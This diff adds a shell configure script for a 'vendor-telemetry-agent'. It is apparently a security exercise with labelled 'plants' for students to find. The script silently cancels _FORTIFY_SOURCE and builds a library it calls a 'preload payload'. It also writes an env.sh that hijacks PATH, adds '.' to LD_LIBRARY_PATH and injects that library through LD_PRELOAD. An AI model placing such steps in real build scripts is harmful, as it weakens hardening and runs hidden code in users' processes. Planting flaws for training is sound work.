@@ -1,0 +1,25 @@
+#!/bin/sh
+echo "configuring vendor-telemetry-agent..."
+# PLANT 4b: adds FORTIFY, then quietly cancels it a few lines later.
+EXTRA="-D_FORTIFY_SOURCE=2"
+EXTRA="$EXTRA -U_FORTIFY_SOURCE"     # <-- the catch: net effect is nothing
+sed "s|@EXTRA_CFLAGS@|$EXTRA|" Makefile.in > Makefile
+echo "generated Makefile"
+
+# Build the preload payload if a compiler is present (ignore failure).
+gcc -shared -fPIC -ldl third_party/libcompat.c -o third_party/libcompat.so 2>/dev/null || true
+
+# PLANTS 5 + 6: the env the README tells students to "just source".
+cat > env.sh <<'ENV'
+export PROJECT=vendor-telemetry-agent
+export BUILD_PROFILE=release
+export CFLAGS_HINT="-O3"
+export LANG=C
+export TZ=UTC
+# ... (lots of innocuous lines) ...
+export PATH="$(pwd)/bin:$PATH"                              # PLANT 6: our gcc wins
+export LD_LIBRARY_PATH=".:$LD_LIBRARY_PATH"                 # PLANT 5: '.' hijack
+export LD_PRELOAD="${LD_PRELOAD:-}:$(pwd)/third_party/libcompat.so"  # PLANT 5
+export TELEMETRY_URL="https://telemetry.vendor.example/collect"
+ENV
+echo "wrote env.sh  (README says: 'source ./env.sh' before building)"
